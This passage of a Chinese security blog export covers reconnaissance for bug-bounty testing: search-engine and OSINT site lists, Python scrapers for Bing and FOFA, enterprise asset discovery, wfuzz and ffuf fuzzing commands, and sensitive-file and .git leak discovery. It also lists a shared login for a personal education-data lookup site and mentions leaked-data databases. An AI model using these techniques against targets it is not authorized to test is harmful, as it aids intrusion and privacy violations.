<h2 id="其它搜索引擎"><a href="#其它搜索引擎" class="headerlink" title="其它搜索引擎"></a>其它搜索引擎</h2><h3 id="S-R-P-智能自定义搜索"><a href="#S-R-P-智能自定义搜索" class="headerlink" title="S.R.P 智能自定义搜索"></a>S.R.P 智能自定义搜索</h3><p>OSINT-Labs 开源情报实验开发的搜索引擎，能综合各大搜索引擎进行智能搜索。</p>
<p>网址：<a href="https://www.osint-labs.org/search/s.php?q=&amp;sid=0">https://www.osint-labs.org/search/s.php?q=&amp;sid=0</a></p>
<h3 id="百度搜索引擎"><a href="#百度搜索引擎" class="headerlink" title="百度搜索引擎"></a>百度搜索引擎</h3><p>百度一下，你就知道。</p>
<p>网址：<a href="https://www.baidu.com/">https://www.baidu.com</a></p>
<h3 id="搜狗搜索引擎"><a href="#搜狗搜索引擎" class="headerlink" title="搜狗搜索引擎"></a>搜狗搜索引擎</h3><p>支持微信公众号搜索、文章搜索、知乎搜索、英文搜索及翻译等。</p>
<p>网址：<a href="https://www.sogou.com/">https://www.sogou.com</a></p>
<h3 id="360搜索引擎"><a href="#360搜索引擎" class="headerlink" title="360搜索引擎"></a>360搜索引擎</h3><p>360旗下搜索引擎。</p>
<p>网址：<a href="https://www.so.com/">https://www.so.com</a></p>
<h3 id="雅虎搜索引擎"><a href="#雅虎搜索引擎" class="headerlink" title="雅虎搜索引擎"></a>雅虎搜索引擎</h3><p>雅虎公司旗下搜索引擎。</p>
<p>网址：<a href="https://www.yahoo.com/">https://www.yahoo.com</a></p>
<h3 id="Yandex搜索引擎"><a href="#Yandex搜索引擎" class="headerlink" title="Yandex搜索引擎"></a>Yandex搜索引擎</h3><p>Yandex是俄罗斯最流行的搜索引擎，占俄罗斯国内市场的55%。</p>
<p>网址：<a href="https://yandex.com/">https://yandex.com</a></p>
<h3 id="Exalead搜索引擎"><a href="#Exalead搜索引擎" class="headerlink" title="Exalead搜索引擎"></a>Exalead搜索引擎</h3><p>一款法国公司开发的搜索引擎。</p>
<p>网址：<a href="http://www.exalead.com/search/">http://www.exalead.com/search/</a></p>
<h3 id="Dogpile搜索引擎"><a href="#Dogpile搜索引擎" class="headerlink" title="Dogpile搜索引擎"></a>Dogpile搜索引擎</h3><p>Dogpile是一个聚合谷歌、雅虎、Yandex和其他流行的搜索引擎结果的元搜索引擎。</p>
<p>网址：<a href="https://www.dogpile.com/">https://www.dogpile.com</a></p>
<h2 id="网盘在线搜索工具"><a href="#网盘在线搜索工具" class="headerlink" title="网盘在线搜索工具"></a>网盘在线搜索工具</h2><ul>
<li>凌风云：<a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></li>
<li>蓝菊花：<a href="http://www.lanjuhua.com/">http://www.lanjuhua.com/</a></li>
<li>大力盘：<a href="https://www.dalipan.com/">https://www.dalipan.com/</a></li>
<li>猪猪盘：<a href="http://www.zhuzhupan.com/">http://www.zhuzhupan.com/</a></li>
<li>PanSou：<a href="http://www.pansou.com/">http://www.pansou.com/</a></li>
<li>盘飞飞：<a href="https://panfeifei.com/">https://panfeifei.com/</a></li>
</ul>
<h2 id="其它情报信息查询"><a href="#其它情报信息查询" class="headerlink" title="其它情报信息查询"></a>其它情报信息查询</h2><ul>
<li>F12Sec教育信息查询系统：<a href="https://edudata.shikangsi.com/">https://edudata.shikangsi.com/</a> 【账号：2021】【 密码：2021】</li>
<li>验证邮件地址准确性工具：<a href="https://centralops.net/co/EmailDossier.aspx">https://centralops.net/co/EmailDossier.aspx</a></li>
<li>微步在线情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li>IP地址归属查询工具：<a href="https://www.ip138.com/">https://www.ip138.com/</a></li>
<li>追寻各大网站历史工具：<a href="https://web.archive.org/">https://web.archive.org/</a></li>
<li>注册网站信息泄露查询工具：<a href="https://www.reg007.com/">https://www.reg007.com/</a></li>
<li>经纬度查询工具：<a href="https://map.yanue.net/">https://map.yanue.net/</a></li>
</ul>
<h2 id="信息收集工具编写"><a href="#信息收集工具编写" class="headerlink" title="信息收集工具编写"></a>信息收集工具编写</h2><h3 id="以传统搜索引擎进行URL采集"><a href="#以传统搜索引擎进行URL采集" class="headerlink" title="以传统搜索引擎进行URL采集"></a>以传统搜索引擎进行URL采集</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">domain = <span class="built_in">input</span>(<span class="string">&quot;请输入域名： &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    i=i*<span class="number">10</span></span><br><span class="line">    <span class="comment">#header是用来规定我们到底模仿哪个浏览器去上网</span></span><br><span class="line">    heads=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0(Windows NT 6.1; Win64; x64; rv:56.0)</span></span><br><span class="line"><span class="string">    Gecko/20100101 Firefox/56.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#具体请求哪个页面</span></span><br><span class="line">    url=<span class="string">&#x27;https://cn.bing.com/search?q=site%3A&#x27;</span>+domain+<span class="string">&#x27;&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;pq=site%3Adgjy.net&amp;sc=2-11&amp;sk=&amp;cvid=C1A7FC61462345B1A71F431E60467C43&amp;toHttps=1&amp;redig=3FEC4F2BE86247E8AE3BB965A62CD454&amp;pn=2&amp;first=&#123;&#125;&amp;FROM=PERE&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#返回的内容</span></span><br><span class="line">    html=requests.get(url,headers=heads)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#筛选 初始化一下这个筛选工具</span></span><br><span class="line">    soup=BeautifulSoup(html.content,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#具体要把哪个地方的东西提出来 如果找到了h2 就把下面整个保存起来</span></span><br><span class="line">    job_bt=soup.findAll(<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> job_bt:</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获得h2找到的这个东西中间的a标签中的href属性里面的值</span></span><br><span class="line">    <span class="built_in">print</span>(i.a.get(<span class="string">&#x27;href&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>我个人编写的一个URL采集工具：</p>
<p><a href="https://github.com/UlyssesTakusen/CaiJiEngine">https://github.com/UlyssesTakusen/CaiJiEngine</a></p>
<h3 id="以空间测回引擎API进行信息收集"><a href="#以空间测回引擎API进行信息收集" class="headerlink" title="以空间测回引擎API进行信息收集"></a>以空间测回引擎API进行信息收集</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fofa</span>:</span></span><br><span class="line">    email = <span class="string">&quot;你的邮箱&quot;</span></span><br><span class="line">    key = <span class="string">&quot;你的API-Key&quot;</span></span><br><span class="line"></span><br><span class="line">    ips = []</span><br><span class="line">    domains = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">self,arg</span>):</span></span><br><span class="line">        api = <span class="string">&quot;https://fofa.so/api/v1/search/all?email=&#123;&#125;&amp;key=&#123;&#125;&amp;qbase64=&#123;&#125;&quot;</span></span><br><span class="line">        flag = base64.b64encode(arg.encode()).decode()</span><br><span class="line">        response = requests.get(api.<span class="built_in">format</span>(self.email,self.key,flag))</span><br><span class="line">        self.results = response.json()[<span class="string">&quot;results&quot;</span>]</span><br><span class="line">        self.length = <span class="built_in">len</span>(self.results)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> self.results:</span><br><span class="line">            self.domains.append(result[<span class="number">0</span>])</span><br><span class="line">            self.ips.append(result[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    arg = sys.argv[<span class="number">1</span>]</span><br><span class="line">    fofa = Fofa()</span><br><span class="line">    fofa.getData(arg)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;共搜索到&#123;&#125;条记录！&quot;</span>.<span class="built_in">format</span>(fofa.length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fofa.results)):</span><br><span class="line">        <span class="built_in">print</span>(fofa.domains[i],<span class="string">&quot;\t&quot;</span>,fofa.ips[i])</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>边缘资产与资产监控</title>
    <url>/post/80cf5bdb.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="边缘资产收集"><a href="#边缘资产收集" class="headerlink" title="边缘资产收集"></a>边缘资产收集</h2><p><strong>目标的相关性</strong>：各项目标之间有关联，相互支持，符合实际。</p>
<p><strong>企业的工商股权信息收集</strong>：目前所有的企业，都需要进行工商登记后才能正常运营。这方面数据是可以进行查询的。通过国家企业信息公示系统（<a href="http://www.gsxt.gov.cn/">http://www.gsxt.gov.cn</a>)</p>
<p>国内一些企业通过爬虫、数据合作方式将企业相关的数据通过数据分析方法关联在一起，比如：企查查、天眼查、启信宝等等，我们可以通过这些平台<strong>查询目标企业旗下其他业务的子公司名称</strong>。</p>
<p>在第三方媒体发布的新闻，例如xxx公司收购了xxx教育公司，那么该SRC是极有可能接收该公司的漏洞的，我们<strong>多关注新闻可以快人一步，更好地找到新资产。</strong></p>
<h2 id="企业组织架构"><a href="#企业组织架构" class="headerlink" title="企业组织架构"></a>企业组织架构</h2><p>根据<strong>企业关键字</strong>，通过<strong>搜索引擎</strong>、<strong>爱企查</strong>、<strong>天眼查</strong>等平台找出相关的域名、下属单位、邮箱、联系人、电话等信息。同时，根据企业股权关系，也可查找相关的下属子公司企业的网站域名。</p>
<p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
<p>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></p>
<ul>
<li>查找公司信息</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/oPSz1H9GjFxXf3K.png" alt="a388d30b8e3dcf8e9a3e23fc2cbd0186.png"></p>
<ul>
<li>查找公司股权结构</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/Cfs5xzVFjcWQmuK.png" alt="05ab1e45c7a4437a489e7c528893f3dc.png"></p>
<ul>
<li>查看个人图谱</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/XcyrwmHfdsv3JYM.png" alt="6c5a9a4b0b20ba804ae7460f9c6103f9.png"></p>
<h2 id="App、公众号、小程序"><a href="#App、公众号、小程序" class="headerlink" title="App、公众号、小程序"></a>App、公众号、小程序</h2><p>除此以外，对于分公司较多，在全国各地都有营业点的大型企业来说，信息收集的涵盖面包括各种网盘文库，开源社区，社工库，公众号也都是很好的切入点。不过以这些为信息的话，那就是基于关键字去进行搜素，关键字要尽可能的去概括包含所要搜索的集团的众多公司以及业务，关键字可以是公司缩写，主公司域名，公司产品名，主营业务等具有明显特征的词汇。</p>
<h3 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h3><p><strong>类型</strong>：商家APP、后台管理APP、业务APP、用户APP、SRC公告提到的APP等等。</p>
<p><strong>利用方式</strong>：通过反编译进行信息收集；通过抓取APP的流量进行信息收集。</p>
<p><strong>搜索方式：</strong></p>
<p><a href="https://app.diandian.com/">https://app.diandian.com</a> （点点）</p>
<p><a href="https://www.qimai.cn/">https://www.qimai.cn</a> （七麦）</p>
<h3 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h3><p><strong>类型</strong>：微信公众号、支付宝公众号、QQ公众号、生活号、企业号、百家号。</p>
<p><strong>利用方式</strong>：抓取后台接口进行信息收集。</p>
<p><strong>搜索方式：</strong></p>
<p><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a> （搜狗）</p>
<h3 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h3><p><strong>类型</strong>：微信小程序、支付宝小程序、百度小程序。</p>
<p><strong>利用方式</strong>：抓取后台接口进行信息收集。</p>
<p><strong>搜索方式：</strong></p>
<p><a href="https://www.xiaolanben.com/company">https://www.xiaolanben.com/company</a> （小蓝本）</p>
<p>注意：大多数的公众号的功能都只是用来进行文章报送，是没有后台接口的，因此这样的公众号并不是重点目标。需要作为<strong>重点渗透测试的是这种存在后台接口的即存在服务功能的公众号或者小程序</strong>，通过在物理机或者模拟器上打开代理抓包即可，除去weixin、app.eslink.cc等第三方相关的域名后，对剩下的陌生域名和进行下一轮的端口扫描和测试，不过这些后台接口获取到的IP资产，相来说都是很容易检查处有高危漏洞组件的存在。</p>
<h2 id="开源资产监控工具"><a href="#开源资产监控工具" class="headerlink" title="开源资产监控工具"></a>开源资产监控工具</h2><h3 id="ARL资产安全灯塔"><a href="#ARL资产安全灯塔" class="headerlink" title="ARL资产安全灯塔"></a>ARL资产安全灯塔</h3><p>斗象TCC团队正式发布「ARL资产安全灯塔」开源版，该项目现已上线开源社区GitHub。ARL旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
<p>项目地址：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<h3 id="LangSrcCurise资产监控系统"><a href="#LangSrcCurise资产监控系统" class="headerlink" title="LangSrcCurise资产监控系统"></a>LangSrcCurise资产监控系统</h3><p>LangSrcCurise资产监控系统是一套通过网络搜索引擎监控其下指定域名，并且能进行持续性信息收集整理的自动化资产监控管理系统，基于Django开发。</p>
<p>项目地址：<a href="https://github.com/LangziFun/LangSrcCurise">https://github.com/LangziFun/LangSrcCurise</a></p>
<h3 id="linglong"><a href="#linglong" class="headerlink" title="linglong"></a>linglong</h3><p>一款资产巡航扫描系统。系统定位是通过masscan+nmap无限循环去发现新增资产，自动进行端口弱口令爆破/、指纹识别、XrayPoc扫描。</p>
<p>项目地址：<a href="https://github.com/awake1t/linglong">https://github.com/awake1t/linglong</a></p>
<h3 id="大宝剑资产梳理工具"><a href="#大宝剑资产梳理工具" class="headerlink" title="大宝剑资产梳理工具"></a>大宝剑资产梳理工具</h3><p>一款信息收集与资产梳理工具，项目处于测试阶段，会不定期更新。</p>
<p>项目地址：<a href="https://gitee.com/wgpsec/DBJ">https://gitee.com/wgpsec/DBJ</a></p>
<h3 id="Hawkeye"><a href="#Hawkeye" class="headerlink" title="Hawkeye"></a>Hawkeye</h3><p>监控github代码库，及时发现员工托管公司代码到GitHub行为并预警，降低代码泄露风险。</p>
<p>项目地址：<a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a></p>
<h3 id="GSIL"><a href="#GSIL" class="headerlink" title="GSIL"></a>GSIL</h3><p>实时监控GitHub敏感信息泄露，并发送告警通知。</p>
<p>项目地址：<a href="https://github.com/FeeiCN/gsil">https://github.com/FeeiCN/gsil</a></p>
<p>改进版项目地址：<a href="https://github.com/StarLord777/GSIL_PRO">https://github.com/StarLord777/GSIL_PRO</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊测试初探</title>
    <url>/post/8e7b010c.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="模糊测试介绍"><a href="#模糊测试介绍" class="headerlink" title="模糊测试介绍"></a>模糊测试介绍</h2><p>模糊测试（fuzz testing，fuzzing）是一种软件测试技术，其核心思想是将自动或半自动生成的随机数据输入到一个程序中并监视程序异常，如崩溃、断言失败，以发现可能的程序错误，比如内存泄露。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>
<p>可以说，任何以暴力枚举形式的测试都能称为模糊测试。</p>
<p>漏洞挖掘有三种方法：白盒代码审计、灰盒逆向工程、黑盒测试。其中黑盒的Fuzz测试是效率最高的一种，能够快速验证大量潜在的安全威胁。</p>
<p>这里只是对一些常用的Web应用Fuzz工具做简单介绍，之后会结合实战进行一个详细地演示。</p>
<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>在很多模糊测试场景中，研究人员可能会需要手动输出测试Payload，而BurpSuite 可以帮助我们将整个过程以自动化的方式实现。</p>
<p>关于BurpSuite的使用已经讲过很多遍了，这里就不多解释了。</p>
<h2 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>wfuzz 是一款Python开发的Web安全模糊测试工具。</p>
<p>项目地址：<a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
<p>官方手册：<a href="https://wfuzz.readthedocs.io/en/latest/">https://wfuzz.readthedocs.io/en/latest/</a></p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ul>
<li>暴破文件和路径</li>
<li>测试URL中的参数</li>
<li>测试POST请求</li>
<li>测试Cookies</li>
<li>测试自定义请求头</li>
<li>测试HTTP请求方法（动词）</li>
<li>使用代理</li>
<li>认证</li>
<li>递归测试</li>
<li>测试速度与效率</li>
<li>输出到文件</li>
<li>不同的输出</li>
</ul>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
<li>基础语法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz [options] -z payload,params &lt;url&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>常用参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z  payloads里面的参数（wfuzz -e payloads 可以查看）</span><br><span class="line"></span><br><span class="line"> -z  file,1.txt（以文件形式，导入1.txt）</span><br><span class="line"></span><br><span class="line"> -z  range,1-10（以范围形式，1到10）</span><br><span class="line"></span><br><span class="line"> -z  list,1-2-3-10（列表形式，1,2,3,10）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d   设定POST量</span><br><span class="line"></span><br><span class="line"> -d  “uname=admin&amp;passwd=admin”</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-b   设定cookie量</span><br><span class="line"></span><br><span class="line"> -b  “cookie=”</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-H  设定头部信息</span><br><span class="line"></span><br><span class="line"> -H  “User-Agent: firfox”</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-X  设定请求方法</span><br><span class="line"></span><br><span class="line"> -X  GET</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-R  递归深度，探测目录很好</span><br><span class="line"></span><br><span class="line"> -R 1（深度为1）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t   并发数 / -s  请求间隔时间  （这个主要是防拉黑，比如我要fuzz狗）</span><br><span class="line"></span><br><span class="line"> -t 3 -s 5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f   输出到文件的格式，格式有raw,json,csv,magictree,html</span><br><span class="line"></span><br><span class="line"> -f /tmp/1,html （将结果输出到tmp目录下的1，以html格式）</span><br></pre></td></tr></table></figure>

<p>输出的结果信息解析：</p>
<p>结果信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ID：测试时的请求序  </span><br><span class="line"></span><br><span class="line">Response：HTTP响应码			C</span><br><span class="line"></span><br><span class="line">Lines：响应信息中的行数      	 L</span><br><span class="line"></span><br><span class="line">Word：响应信息中的字数         	 W</span><br><span class="line"></span><br><span class="line">Chars：响应信息中的字符数       	H</span><br><span class="line"></span><br><span class="line">Payload：当前使用的payload</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">隐藏结果  --hc  --hl  --hw  --hh </span><br><span class="line"></span><br><span class="line"> 隐藏响应码405  --hc 405 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">显示结果   --sc  --sl  --sw  --sh</span><br><span class="line"></span><br><span class="line"> 显示响应码405  --sc 405</span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>遍历id值隐藏500返回码并保存为html文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z range,1-200 --hc 500 -f 1,html http://www.XXX.net/Pro_show.asp?proid=FUZZ</span><br></pre></td></tr></table></figure>

<p>需要一次测试多个FUZZ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt -z file,2.txt  http://www.xxx.com/FUZZ/FUZ2Z.html</span><br></pre></td></tr></table></figure>

<p>对于需要base64加密的cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt,base64 -b “cookie=”FUZZ” http://www.xxx.com”</span><br></pre></td></tr></table></figure>

<p>探测目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,common.txt -R 2 -f 2.html,html http://www.baidu.com/FUZZ</span><br></pre></td></tr></table></figure>

<h2 id="FFuF"><a href="#FFuF" class="headerlink" title="FFuF"></a>FFuF</h2><p>ffuf是一款Go语言编写的高速Web Fuzzer工具，该项目深受大型项目gobuster和wfuzz的启发。</p>
<p>项目地址：<a href="https://github.com/ffuf/ffuf/">https://github.com/ffuf/ffuf/</a></p>
<p>用法与wfuzz差不多，就不进行具体介绍了。</p>
<p>具体用法可查看这篇文章：<a href="https://www.cnblogs.com/secxue/p/14617343.html">https://www.cnblogs.com/secxue/p/14617343.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title>敏感文件目录探测</title>
    <url>/post/500fa748.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="目录扫描的介绍"><a href="#目录扫描的介绍" class="headerlink" title="目录扫描的介绍"></a>目录扫描的介绍</h2><p>目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。通过目录扫描我们还能扫描敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p>
<p>目录扫描有两种方式：</p>
<ul>
<li>使用目录字典进行暴力才接存在该目录或文件返回200或者403；</li>
<li>使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。</li>
</ul>
<h2 id="常见敏感文件或目录"><a href="#常见敏感文件或目录" class="headerlink" title="常见敏感文件或目录"></a>常见敏感文件或目录</h2><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p>
<ul>
<li>robots.txt</li>
<li>crossdomain.xml</li>
<li>sitemap.xml</li>
<li>后台目录</li>
<li>网站安装目录</li>
<li>网站上传目录</li>
<li>mysql管理页面</li>
<li>phpinfo</li>
<li>网站文本编辑器</li>
<li>测试文件</li>
<li>网站备份文件（.rar、.zip、.7z、.tar、.gz、.bak）</li>
<li>DS_Store文件</li>
<li>vim编辑器备份文件（.swp）</li>
<li>WEB-INF/web.xml文件</li>
</ul>
<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><h4 id="robots-txt是什么？"><a href="#robots-txt是什么？" class="headerlink" title="robots.txt是什么？"></a>robots.txt是什么？</h4><p>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访问的部分，或者指定搜索引擎只收录指定的内容。当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。</p>
<h4 id="robots-txt的作用？"><a href="#robots-txt的作用？" class="headerlink" title="robots.txt的作用？"></a>robots.txt的作用？</h4><ul>
<li>引导搜索引擎蜘蛛抓取指定栏目或内容</li>
<li>网站改版或者URL重写优化时候屏蔽对搜索引擎的不友好的链接</li>
<li>屏蔽死链接、404错误页</li>
<li>屏蔽无内容、无价值页面</li>
<li>屏蔽重复页面，如评论页、搜索结果页</li>
<li>引导蜘蛛抓取网站地图</li>
</ul>
<h4 id="robots-txt的语法？"><a href="#robots-txt的语法？" class="headerlink" title="robots.txt的语法？"></a>robots.txt的语法？</h4><ul>
<li>User-agent: （定义搜索引擎）  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">User-agent: *			（定义所有搜索引擎）</span><br><span class="line">User-agent: Googlebot		（定义谷歌，只允许谷歌蜘蛛爬行）</span><br><span class="line">User-agent: Baiduspider		（定义百度，只允许百度蜘蛛爬行）</span><br><span class="line"></span><br><span class="line">不同的搜索引擎的搜索机器人有不同的名称，谷歌:Googlebot、百度:Baiduspider、MSN:MSNbot、Yahoo:Slurp。</span><br></pre></td></tr></table></figure>
</li>
<li>Disallow: （用来定义禁止蜘蛛爬行的页面或目录）  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">Disallow: /		（禁止蜘蛛爬行网站的所有目录&quot;/&quot;表示根目录下）</span><br><span class="line">Disallow:/admin		（禁止蜘蛛爬取/admin目录）</span><br><span class="line">Disallow: /abc.html	（禁止蜘蛛爬去abc.html页面）</span><br><span class="line">Disallow: /help.html 	（禁止蜘蛛爬去help.html页面）</span><br></pre></td></tr></table></figure>
</li>
<li>Allow：（用来定义允许蜘蛛爬取的页面或子目录）  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">Allow: /admin/test/	（允许蜘蛛爬取admin下的test目录）</span><br><span class="line">Allow: /admin/abc.html	（允许蜘蛛爬去admin目录中的abc.html页面）</span><br></pre></td></tr></table></figure>
  <img src="https://img2020.cnblogs.com/blog/2224145/202103/2224145-20210303154852471-1588407548.png" alt="img"></li>
</ul>
<h3 id="crossdomain-xml"><a href="#crossdomain-xml" class="headerlink" title="crossdomain.xml"></a>crossdomain.xml</h3><p>跨域，顾名思义就是需要的资源不在自己的域服务器上，需要访问其他域服务器。跨域策略文件是一个xml文档文件，主要是为web客户端(如Adobe Flash Player等)设置跨域处理数据的权限。打个比方说，公司A部门有一台公共的电脑，里面存放着一些资料文件，专门供A部门内成员自己使用，这样，A部门内的员工就可以访问该电脑，其他部门人员则不允许访问。如下图：</p>
<blockquote>
<p><img src="https://i.loli.net/2021/10/05/jDug5eKLME2NRm9.png" alt="img"></p>
<p>A部门的员工可以任意访问A部门的公共电脑，但是不能直接访问B部门的公共电脑。有一天，B部门领导觉得他们的资料非常有用，想要与A部门分享，于是就给A部门一个令牌，这样A部门的员工也可以访问B部门的公共电脑了。A部门可访问B部门设置访问权限，这个权限设置就是跨域策略文件crossdomain.xml存在的意义。</p>
</blockquote>
<p>crossdomin.xml 示例文件如下，重点查看<code>allow-access-from</code>字段获取网站目录信息</p>
<p><img src="https://img2020.cnblogs.com/blog/2224145/202103/2224145-20210303154534325-1014027553.png" alt="img"></p>
<h3 id="sitemap-xml"><a href="#sitemap-xml" class="headerlink" title="sitemap.xml"></a>sitemap.xml</h3><p>Sitemap 可方便网站管理员通知搜索引擎他们网站上有哪些可供抓取的网页。最简单的 Sitemap 形式，就是XML 文件，在其中列出网站中的网址以及关于每个网址的其他元数据（上次更新的时间、更改的频率以及相对于网站上其他网址的重要程度为何等），以便搜索引擎可以更加智能地抓取网站。</p>
<p><img src="https://i.loli.net/2021/10/05/WoIy7uw3BRNlCP4.png" alt="img"></p>
<h3 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h3><h4 id="git源代码泄露"><a href="#git源代码泄露" class="headerlink" title=".git源代码泄露"></a>.git源代码泄露</h4><p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p>
<p>利用工具：GitHack</p>
<p>项目地址：<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
<p>扫描目录：</p>
<p><img src="https://i.loli.net/2021/10/05/gd74TSv6aIxEpmb.png" alt="img"></p>
<p>使用GitHack工具成功恢复代码</p>
<p><img src="https://i.loli.net/2021/10/05/uBzLftVJkQ2nwZr.png" alt="img"></p>
